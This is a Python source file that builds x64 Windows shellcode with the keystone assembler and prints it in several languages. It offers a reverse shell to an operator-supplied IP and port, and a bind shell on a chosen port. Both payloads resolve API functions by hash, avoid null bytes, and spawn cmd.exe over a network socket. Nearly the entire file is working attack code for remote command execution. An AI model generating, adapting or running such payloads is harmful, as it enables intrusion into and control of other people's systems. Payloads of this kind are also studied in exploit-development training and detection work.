#!/usr/bin/python3
import struct, argparse, keystone

def sin_ip(ip_addr):
    ip = "0x"
    null = False

    for block in ip_addr.split(".")[::-1]:
        ip += f"{int(block):02x}"

        if f"{int(block):02x}" == "00":
            null = True

    if null:
        neg_ip = hex((~int(ip, 16) + 1) & 0xffffffff)

        result = [
            f"mov edx, {neg_ip};",
            "neg edx;"
        ]

        result = "".join(result)
    else:
       result = f"mov edx, {ip};"

    return result

def sin_port(port):
    hex_port = f"{int(port):04x}"

    if "00" == hex_port[0:2]:
        result = f"cdq; mov dh, 0x{hex_port[2:4]};"
    elif "00" == hex_port[2:4]:
        result = f"mov dl, 0x{hex_port[0:2]};"
    else:
        result = f"mov dx, 0x{hex_port[2:4]}{hex_port[0:2]};"

    return result

def revshell(ip, port):
    shellcode = [
        "_start                              :",
        "    push rsp                        ;", # stack
        "    pop rbp                         ;", # new stack frame
        "    sub rsp, 0x20                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor rcx, rcx                ;", # TEB structure
        "        mov rsi, gs:[rcx + 0x60]    ;", # PEB structure
        "        mov rsi, [rsi + 0x18]       ;", # ntdll!PebLdr
        "        mov rsi, [rsi + 0x20]       ;", # InMemoryOrderModuleList
        "        mov rsi, [rsi]              ;", # ntdll.dll
        "        lodsq                       ;", # kernel32.dll
        "        mov rbx, [rax + 0x20]       ;", # kernel32 base

        "        jmp .find_short             ;", # short jump
        "    .find_ret                       :",
        "        pop rsi                     ;", # $rsi = return addr
        "        mov [rbp - 0x8], rsi        ;", # var8 = .find_function
        "        jmp .symbol_kernel32        ;", # load function from kernel32

        "    .find_short                     :",
        "        call .find_ret              ;", # relative call

        "    .find_function                  :",
        "        mov eax, [rbx + 0x3c]       ;", # RVA to PE signature
        "        add rax, rbx                ;", # PE signature
        "        xor rcx, rcx                ;", # $rcx = 0x0
        "        mov cl, 0x88                ;", # Offset to Export Table
        "        mov r10d, [rax + rcx]       ;", # RVA of Export Table
        "        add r10, rbx                ;", # Export table
        "        mov ecx, [r10 + 0x18]       ;", # NR of Names
        "        mov edi, [r10 + 0x20]       ;", # RVA of Name Pointer Table
        "        add rdi, rbx                ;", # Name Pointer Table

        "    .find_loop                      :",
        "        jrcxz .find_end             ;", # if rcx == 0
        "        dec ecx                     ;", # counter -= 1
        "        xor rsi, rsi                ;", # $rsi = 0x0
        "        push rsi                    ;", # 0x0
        "        pop rax                     ;", # $rax = 0x0
        "        cdq                         ;", # $rdx = 0x0
        "        mov esi, [rdi + rcx * 4]    ;", # RVA of Symbol Name
        "        add rsi, rbx                ;", # Symbol Name

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from rsi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # if ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "    .compare_hash                   :",
        "        cmp edx, r13d               ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if ZF != 1
        "        mov r11d, [r10 + 0x24]      ;", # RVA of Ordinal Table
        "        add r11, rbx                ;", # Ordinal Table
        "        mov cx, [r11 + 2 * rcx]     ;", # extrapolate ordinal functions
        "        mov r12d, [r10 + 0x1c]      ;", # RVA of Address Table
        "        add r12, rbx                ;", # Address Table
        "        mov eax, [r12 + 4 * rcx]    ;", # RVA of function
        "        add rax, rbx                ;", # function

        "    .find_end                       :",
        "        ret                         ;", # return

        "    .symbol_kernel32                :",
        "        mov r13d, 0x8ee05933        ;", # TerminateProcess() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x10], rax       ;", # var16 = TerminateProcess()

        "        mov r13d, 0xa9f72dc9        ;", # CreateProcessA() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x18], rax       ;", # var32 = CreateProcessA()

        "        mov r13d, 0x583c436c        ;", # LoadLibraryA() hash
        "        call [rbp - 0x8]            ;", # call .find_function

        "    .load_ws2_32                    :",
        "        xor rdx, rdx                ;", # $rdx = 0x0
        "        mov dx, 0x6c6c              ;", # "ll"
        "        push rdx                    ;", # "ll\x00"
        "        mov rdx, 0x642e32335f327377 ;", # "ws2_32.d"
        "        push rdx                    ;", # "ws2_32.dll\x00"
        "        push rsp                    ;", # &"ws2_32.dll"
        "        pop rcx                     ;", # lpLibFileName
        "        sub rsp, 0x20               ;", # space for call
        "        call rax                    ;", # call LoadLibraryA()

        "    .symbol_ws2_32                  :",
        "        push rax                    ;", # ws2_32 base
        "        pop rbx                     ;", # $rbx = ws2_32 base

        "        mov r13d, 0xe0a06fc5        ;", # WSASocketA() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x20], rax       ;", # var48 = WSASocketA()

        "        mov r13d, 0xe0966ca8        ;", # WSAConnect() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x28], rax       ;", # var56 = WSAConnect()

        "        mov r13d, 0xe17a7010        ;", # WSAStartup() hash
        "        call [rbp - 0x8]            ;", # call .find_function

        "    .call_wsastartup                :",
        "        xor rcx, rcx                ;", # $rcx = 0x0
        "        mov cx, 0x198               ;", # $rcx = 0x198
        "        sub rsp, rcx                ;", # sub cx to avoid overwriting
        "        push rsp                    ;", # space
        "        pop rdx                     ;", # lpWSAData
        "        mov cx, 0x0202              ;", # wVersionRequired
        "        call rax                    ;", # call WSAStartup()

        "    .call_wsasocketa                :",
        "        push 0x2                    ;", # 0x2
        "        pop rcx                     ;", # af
        "        push 0x1                    ;", # 0x1
        "        pop rdx                     ;", # type
        "        push 0x6                    ;", # 0x6
        "        pop r8                      ;", # protocol
        "        xor r9, r9                  ;", # lpProtocolInfo
        "        mov [rsp + 0x20], r9        ;", # g
        "        mov [rsp + 0x28], r9        ;", # dwFlags
        "        call [rbp - 0x20]           ;", # call WSASocketA()
        "        push rax                    ;", # descriptor
        "        pop rdi                     ;", # $rsi = descriptor

        "    .call_wsaconnect                :",
        "        push 0x2                    ;", # sin_family
        "        pop rdx                     ;", # sin_family
        "        mov [rsp], rdx              ;", # sockaddr_in
        sin_port(port),                          # port
        "        mov [rsp + 0x2], rdx        ;", # sin_port
        sin_ip(ip),                              # ip address
        "        mov [rsp + 0x4], rdx        ;", # sin_addr

        "        push rax                    ;", # descriptor
        "        pop rcx                     ;", # s
        "        push rsp                    ;", # &name
        "        pop rdx                     ;", # name
        "        push 0x16                   ;", # 22
        "        pop r8                      ;", # namelen
        "        xor r9, r9                  ;", # lpCallerData
        "        sub rsp, 0x38               ;", # space for call
        "        mov [rsp + 0x20], r9        ;", # lpCalleeData
        "        mov [rsp + 0x28], r9        ;", # lpSQOS
        "        mov [rsp + 0x30], r9        ;", # lpGQOS
        "        call [rbp - 0x28]           ;", # call WSAConnect()
        "        add rsp, 0x38               ;", # restore stack

        "    .create_startupinfoa            :",
        "        push rdi                    ;", # hStdError
        "        push rdi                    ;", # hStdOutput
        "        push rdi                    ;", # hStdInput
        "        cdq                         ;", # $rdx = 0x0
        "        push dx                     ;", # lpReserved2
        "        push rdx                    ;", # cbReserved2
        "        push rdx                    ;", # wShowWindow
        "        inc dh                      ;", # $rdx = 0x100
        "        push dx                     ;", # dwFlags
        "        dec dh                      ;", # $rdx = 0x0
        "        push dx                     ;", # dwFillAttribute
        "        push dx                     ;", # dwFillAttribute
        "        push rdx                    ;", # dwYCountChars & dwXCountChars
        "        push rdx                    ;", # dwYSize & dwXSize
        "        push rdx                    ;", # dwY & dwX
        "        push rdx                    ;", # lpTitle
        "        push rdx                    ;", # lpDesktop
        "        push rdx                    ;", # lpReserved
        "        mov dl, 0x68                ;", # $rdx = 0x68
        "        push rdx                    ;", # cb
        "        push rsp                    ;", # structure
        "        pop rdi                     ;", # $rdi = startupinfoa

        "    .create_string                  :",
        "        mov rax, 0xff9a879ad19b929d ;", # $rax = neg "cmd.exe\x00"
        "        neg rax                     ;", # $rax = "cmd.exe\x00"
        "        push rax                    ;", # "cmd.exe"
        "        push rsp                    ;", # &"cmd.exe"
        "        pop rdx                     ;", # lpCommandLine

        "    .call_createprocessa            :",
        "        push rsp                    ;", # stack
        "        pop rax                     ;", # $rax = $rsp
        "        sub rax, 0x20               ;", # space for structure
        "        push rax                    ;", # lpProcessInformation
        "        push rdi                    ;", # lpStartupInfo
        "        xor rcx, rcx                ;", # lpApplicationName
        "        push rcx                    ;", # lpCurrentDirectory
        "        push rcx                    ;", # lpEnvironment
        "        push rcx                    ;", # dwCreationFlags
        "        inc cl                      ;", # $rcx = 0x1
        "        push rcx                    ;", # bInheritHandles
        "        dec cl                      ;", # $rcx = 0x0
        "        push rcx                    ;", # space for lpThreadAttributes
        "        push rcx                    ;", # space for lpProcessAttributes
        "        push rcx                    ;", # space for lpCommandLine
        "        push rcx                    ;", # space for lpApplicationName
        "        xor r8, r8                  ;", # lpProcessAttributes
        "        xor r9, r9                  ;", # lpThreadAttributes
        "        call [rbp - 0x18]           ;", # call CreateProcessA()

        "    .exit                           :",
        "        push 0xffffffffffffffff     ;", # -1
        "        pop rcx                     ;", # hProcess
        "        cdq                         ;", # uExitCode
        "        call [rbp - 0x10]           ;", # call TerminateProcess()
    ]

    return "".join(shellcode)

def bindshell(port):
    shellcode = [
        "_start                              :",
        "    push rsp                        ;", # stack
        "    pop rbp                         ;", # new stack frame
        "    sub rsp, 0x20                   ;", # space for variables

        "    .find_kernel32                  :",
        "        xor rcx, rcx                ;", # TEB structure
        "        mov rsi, gs:[rcx + 0x60]    ;", # PEB structure
        "        mov rsi, [rsi + 0x18]       ;", # ntdll!PebLdr
        "        mov rsi, [rsi + 0x20]       ;", # InMemoryOrderModuleList
        "        mov rsi, [rsi]              ;", # ntdll.dll
        "        lodsq                       ;", # kernel32.dll
        "        mov rbx, [rax + 0x20]       ;", # kernel32 base

        "        jmp .find_short             ;", # short jump
        "    .find_ret                       :",
        "        pop rsi                     ;", # $rsi = return addr
        "        mov [rbp - 0x8], rsi        ;", # var8 = .find_function
        "        jmp .symbol_kernel32        ;", # load function from kernel32

        "    .find_short                     :",
        "        call .find_ret              ;", # relative call

        "    .find_function                  :",
        "        mov eax, [rbx + 0x3c]       ;", # RVA to PE signature
        "        add rax, rbx                ;", # PE signature
        "        xor rcx, rcx                ;", # $rcx = 0x0
        "        mov cl, 0x88                ;", # Offset to Export Table
        "        mov r10d, [rax + rcx]       ;", # RVA of Export Table
        "        add r10, rbx                ;", # Export table
        "        mov ecx, [r10 + 0x18]       ;", # NR of Names
        "        mov edi, [r10 + 0x20]       ;", # RVA of Name Pointer Table
        "        add rdi, rbx                ;", # Name Pointer Table

        "    .find_loop                      :",
        "        jrcxz .find_end             ;", # if rcx == 0
        "        dec ecx                     ;", # counter -= 1
        "        xor rsi, rsi                ;", # $rsi = 0x0
        "        push rsi                    ;", # 0x0
        "        pop rax                     ;", # $rax = 0x0
        "        cdq                         ;", # $rdx = 0x0
        "        mov esi, [rdi + rcx * 4]    ;", # RVA of Symbol Name
        "        add rsi, rbx                ;", # Symbol Name

        "    .compute_hash                   :",
        "        lodsb                       ;", # load in al next byte from rsi
        "        test al, al                 ;", # check null terminator
        "        jz .compare_hash            ;", # if ZF == 1
        "        ror edx, 0x2f               ;", # rot 47
        "        add edx, eax                ;", # add new byte
        "        jmp .compute_hash           ;", # loop

        "    .compare_hash                   :",
        "        cmp edx, r13d               ;", # cmp edx, hash
        "        jnz .find_loop              ;", # if ZF != 1
        "        mov r11d, [r10 + 0x24]      ;", # RVA of Ordinal Table
        "        add r11, rbx                ;", # Ordinal Table
        "        mov cx, [r11 + 2 * rcx]     ;", # extrapolate ordinal functions
        "        mov r12d, [r10 + 0x1c]      ;", # RVA of Address Table
        "        add r12, rbx                ;", # Address Table
        "        mov eax, [r12 + 4 * rcx]    ;", # RVA of function
        "        add rax, rbx                ;", # function

        "    .find_end                       :",
        "        ret                         ;", # return

        "    .symbol_kernel32                :",
        "        mov r13d, 0x8ee05933        ;", # TerminateProcess() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x10], rax       ;", # var16 = TerminateProcess()

        "        mov r13d, 0xa9f72dc9        ;", # CreateProcessA() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x18], rax       ;", # var32 = CreateProcessA()

        "        mov r13d, 0x583c436c        ;", # LoadLibraryA() hash
        "        call [rbp - 0x8]            ;", # call .find_function

        "    .load_ws2_32                    :",
        "        xor rdx, rdx                ;", # $rdx = 0x0
        "        mov dx, 0x6c6c              ;", # "ll"
        "        push rdx                    ;", # "ll\x00"
        "        mov rdx, 0x642e32335f327377 ;", # "ws2_32.d"
        "        push rdx                    ;", # "ws2_32.dll\x00"
        "        push rsp                    ;", # &"ws2_32.dll"
        "        pop rcx                     ;", # lpLibFileName
        "        sub rsp, 0x20               ;", # space for call
        "        call rax                    ;", # call LoadLibraryA()

        "    .symbol_ws2_32                  :",
        "        push rax                    ;", # ws2_32
        "        pop rbx                     ;", # $rbx = ws2_32 base

        "        mov r13d, 0xe0a06fc5        ;", # WSASocketA() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x20], rax       ;", # var48 = WSASocketA()

        "        mov r13d, 0x3ec0208         ;", # bind() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x28], rax       ;", # var56 = bind()

        "        mov r13d, 0x11e208ce        ;", # listen() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x30], rax       ;", # var64 = listen()

        "        mov r13d, 0x10180838        ;", # accept() hash
        "        call [rbp - 0x8]            ;", # call .find_function
        "        mov [rbp - 0x38], rax       ;", # var72 = accept()

        "        mov r13d, 0xe17a7010        ;", # WSAStartup() hash
        "        call [rbp - 0x8]            ;", # call .find_function

        "    .call_wsastartup                :",
        "        xor rcx, rcx                ;", # $rcx = 0x0
        "        mov cx, 0x198               ;", # $rcx = 0x198
        "        sub rsp, rcx                ;", # sub cx to avoid overwriting
        "        push rsp                    ;", # space
        "        pop rdx                     ;", # lpWSAData
        "        mov cx, 0x0202              ;", # wVersionRequired
        "        call rax                    ;", # call WSAStartup()

        "    .call_wsasocketa                :",
        "        push 0x2                    ;", # 0x2
        "        pop rcx                     ;", # af
        "        push 0x1                    ;", # 0x1
        "        pop rdx                     ;", # type
        "        push 0x6                    ;", # 0x6
        "        pop r8                      ;", # protocol
        "        xor r9, r9                  ;", # lpProtocolInfo
        "        mov [rsp + 0x20], r9        ;", # g
        "        mov [rsp + 0x28], r9        ;", # dwFlags
        "        call [rbp - 0x20]           ;", # call WSASocketA()
        "        push rax                    ;", # descriptor
        "        pop rdi                     ;", # $rdi = descriptor

        "    .call_bind                      :",
        "        push 0x2                    ;", # 0x2
        "        pop rdx                     ;", # sin_family
        "        mov [rsp], rdx              ;", # sockaddr_in
        sin_port(port),                          # port
        "        mov [rsp + 0x2], rdx        ;", # sin_port
        "        cdq                         ;", # "0.0.0.0"
        "        mov [rsp + 0x4], rdx        ;", # sin_addr

        "        push rdi                    ;", # descriptor
        "        pop rcx                     ;", # s
        "        push rsp                    ;", # &name
        "        pop rdx                     ;", # name
        "        push 0x16                   ;", # 0x16
        "        pop r8                      ;", # namelen
        "        call [rbp - 0x28]           ;", # call bind()

        "    .call_listen                    :",
        "        push rdi                    ;", # descriptor
        "        pop rcx                     ;", # s
        "        cdq                         ;", # backlog
        "        call [rbp - 0x30]           ;", # call listen()

        "    .call_accept                    :",
        "        push rdi                    ;", # descriptor
        "        pop rcx                     ;", # s
        "        cdq                         ;", # name
        "        xor r8, r8                  ;", # namelen
        "        call [rbp - 0x38]           ;", # call accept()
        "        push rax                    ;", # descriptor
        "        pop rdi                     ;", # $rdi = descriptor


        "    .create_startupinfoa            :",
        "        push rdi                    ;", # hStdError
        "        push rdi                    ;", # hStdOutput
        "        push rdi                    ;", # hStdInput
        "        cdq                         ;", # $rdx = 0x0
        "        push dx                     ;", # lpReserved2
        "        push rdx                    ;", # cbReserved2
        "        push rdx                    ;", # wShowWindow
        "        inc dh                      ;", # $rdx = 0x100
        "        push dx                     ;", # dwFlags
        "        dec dh                      ;", # $rdx = 0x0
        "        push dx                     ;", # dwFillAttribute
        "        push dx                     ;", # dwFillAttribute
        "        push rdx                    ;", # dwYCountChars & dwXCountChars
        "        push rdx                    ;", # dwYSize & dwXSize
        "        push rdx                    ;", # dwY & dwX
        "        push rdx                    ;", # lpTitle
        "        push rdx                    ;", # lpDesktop
        "        push rdx                    ;", # lpReserved
        "        mov dl, 0x68                ;", # $rdx = 0x68
        "        push rdx                    ;", # cb
        "        push rsp                    ;", # structure
        "        pop rdi                     ;", # $rdi = startupinfoa

        "    .create_string                  :",
        "        mov rax, 0xff9a879ad19b929d ;", # $rax = neg "cmd.exe\x00"
        "        neg rax                     ;", # $rax = "cmd.exe\x00"
        "        push rax                    ;", # "cmd.exe"
        "        push rsp                    ;", # &"cmd.exe"
        "        pop rdx                     ;", # lpCommandLine

        "    .call_createprocessa            :",
        "        push rsp                    ;", # stack
        "        pop rax                     ;", # $rax = $rsp
        "        sub rax, 0x20               ;", # space for structure
        "        push rax                    ;", # lpProcessInformation
        "        push rdi                    ;", # lpStartupInfo
        "        xor rcx, rcx                ;", # lpApplicationName
        "        push rcx                    ;", # lpCurrentDirectory
        "        push rcx                    ;", # lpEnvironment
        "        push rcx                    ;", # dwCreationFlags
        "        inc cl                      ;", # $rcx = 0x1
        "        push rcx                    ;", # bInheritHandles
        "        dec cl                      ;", # $rcx = 0x0
        "        push rcx                    ;", # space for lpThreadAttributes
        "        push rcx                    ;", # space for lpProcessAttributes
        "        push rcx                    ;", # space for lpCommandLine
        "        push rcx                    ;", # space for lpApplicationName
        "        xor r8, r8                  ;", # lpProcessAttributes
        "        xor r9, r9                  ;", # lpThreadAttributes
        "        call [rbp - 0x18]           ;", # call CreateProcessA()

        "    .exit                           :",
        "        push 0xffffffffffffffff     ;", # -1
        "        pop rcx                     ;", # hProcess
        "        cdq                         ;", # uExitCode
        "        call [rbp - 0x10]           ;", # call TerminateProcess()
    ]

    return "".join(shellcode)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--revshell", action="store_true", help="Send a reverse shell to specified ip and port")
    parser.add_argument("--bindshell", action="store_true", help="Start a bind shell in specified port")
    parser.add_argument("--ip", help="IP address for send reverse shell")
    parser.add_argument("--port", help="Port for send/start reverse/bind shell")
    parser.add_argument("--format", help="Format for display shellcode (py/c#/c/rs)")
    parser.add_argument("--length", type=int, help="Length to bytes for line", default=11)
    args = parser.parse_args()

    if args.revshell:
        if args.ip and args.port:
            shellcode = revshell(args.ip, args.port)
        else:
            print("Arguments required: (--ip/--port)")
            exit(1)
    elif args.bindshell:
        if args.port:
            shellcode = bindshell(args.port)
        else:
            print("Argument required: (--port)")
            exit(1)
    else:
        print("Option required: (--revshell/--bindshell)")
        exit(1)

    opcodes, count = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64).asm(shellcode)

    if args.format:
        if args.format.lower() == "python" or args.format.lower() == "py":
            output = "shellcode  = b\"\""
            length = args.length

            for i in range(0, len(opcodes), length):
                line = ""

                for opcode in opcodes[i:i+length]:
                    line += f"\\x{opcode:02x}"

                output += f"\nshellcode += b\"{line}\""

            print(output)

        elif args.format.lower() == "c#" or args.format.lower() == "csharp" or args.format.lower() == "cs":
            output = f"byte[] shellcode = new byte[{len(opcodes)}] {{\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                output += "    "

                for j in range(length):
                    if i + j < len(opcodes):
                        output += f"0x{opcodes[i+j]:02x},"

                output += "\n"

            output = output[:-2] + "\n};"
            print(output)

        elif args.format.lower() == "c":
            output = f"char shellcode[{len(opcodes)}] =\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                line = ""

                for opcode in opcodes[i:i+length]:
                    line += f"\\x{opcode:02x}"

                output += f"    \"{line}\"\n"

            output = output[:-1] + ";"
            print(output)

        elif args.format.lower() == "rust" or args.format.lower() == "rs":
            output = f"let shellcode: [u8; {len(opcodes)}] = [\n"
            length = args.length

            for i in range(0, len(opcodes), length):
                output += "    "

                for j in range(length):
                    if i + j < len(opcodes):
                        output += f"0x{opcodes[i+j]:02x},"

                output += "\n"

            output = output[:-2] + "\n];"
            print(output)

        else:
            print("Avaiable formats: (c, csharp, python, rust)")
            exit(1)
    else:
            print("Format required: (--format): [c, csharp, python, rust]")
            exit(1)
